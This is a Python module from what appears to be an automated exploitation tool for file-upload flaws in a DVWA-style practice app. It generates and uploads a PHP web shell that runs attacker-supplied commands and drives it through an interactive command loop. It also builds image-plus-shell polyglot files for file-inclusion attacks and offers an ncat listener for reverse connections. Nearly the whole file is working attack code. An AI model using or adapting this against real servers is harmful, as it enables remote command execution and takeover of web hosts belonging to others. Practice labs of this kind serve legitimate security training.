from .weak_session import SESSION
from bs4 import BeautifulSoup

import string
import random
import os
import subprocess
import requests

class FILE(object):

  cookie = SESSION.cookie
  driver = SESSION.driver

  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies


  def file(self):
    if self.cookies['security'] == "high":
      while True:
        image = input("choice you image file:")
        server_file = input("choice you shell file:")
        tmp_img = image.split("/")[-1]
        tmp_file = server_file.split("/")[-1]
        os.system("cat "+image+" "+server_file+" > /tmp/"+tmp_img+"_"+tmp_file+".jpg")
        if os.path.isfile("/tmp/"+tmp_img+"_"+tmp_file+".jpg"):
          imagefile = "/tmp/"+tmp_img+"_"+tmp_file+".jpg"
          print("file create")
          print(imagefile)
          self.check(imagefile)
          print("you cen use thes file exploit with other vulnerability",end='')
          print(" such as file include")
          break
    else:
      self.Try()

  def Try(self):
    for key in self.cookies:
      self.cookie['name'] = key
      self.cookie['value'] = self.cookies[key]
      self.driver.add_cookie(self.cookie)

    options = ["php","choice my own file"]
    for x,i in enumerate(options,start=0):
      print(x," ",i)

    while True:
      choice = input("which type file you want to upload?:")
      if choice not in string.digits:
        print("wrong chioce,rechoice again!")
      elif choice.isdigit() and int(choice) < len(options):
        choice = int(choice)
        break

    if options[choice] == 'php':
      print("Generate File")
      rand = ''.join(random.sample(string.ascii_letters+string.digits,8))
      File = rand+"."+options[choice]
      path = os.path.exists("/tmp/")
      if path:
        call = subprocess.check_call("echo '<?php $c=chr(99);if(isset($_POST[$c]))system($_POST[$c]); ?>' > /tmp/"+File,shell=True)
        if not call:
          valid = self.check("/tmp/"+File)
          if File in valid:
            subprocess.check_call("rm /tmp/"+File,shell=True)
            print("tmp file has been removede")
            self.shell(valid)

    if options[choice] == "choice my own file":
      file_path = input("input you file path:")
      if file_path:
        if os.path.exists(file_path):
          file_check = os.path.isfile(file_path)
          if file_check:
            self.check(file_path)
            nc = input("open with ncat?:")
            if nc in "yYyesYes":
              port = input("input you listen port:")
              os.system("nc -lvnp "+port)
            else:
              sys.exit()
        else:
          print("not such file")



  def shell(self,valid):
    data = {}
    while True:
      data['c'] = input("\033[1;32mshell:\033[0m")
      rep = requests.post(valid,cookies=self.cookies,data=data)
      if not rep.ok:
        break
      print(rep.text,end='')


  def check(self,file_send):
    if self.cookies['security'] == 'medium' or self.cookies['security'] == 'high':
      files = {'uploaded':(file_send,open(file_send,'rb'),'image/png')}
      data = {'Upload':'Upload'}
      print("before")
      rep = requests.post(self.url,cookies=self.cookies,files=files,data=data)
      print("after")
      soup = BeautifulSoup(rep.text,"html5lib")
      text = soup.find_all("pre")[0].text
    elif self.cookies['security'] == 'low':
      self.driver.get(self.url)
      self.driver.find_element_by_name("uploaded").send_keys(file_send)
      self.driver.find_element_by_name("Upload").click()
      text = self.driver.find_element_by_tag_name("pre").text

    url = self.url
    count = 0
    str1 = ''
    for each in url:
      if count == 3:
        break
      if each == '/':
        count += 1
      str1 = str1 + ''.join(each)
    check_path = str1+text.split("../../")[-1].split(" ")[0]
    print("check file status")
    rep = requests.get(check_path)
    if rep.ok:
      print(check_path,"upload file valid")

    return check_path

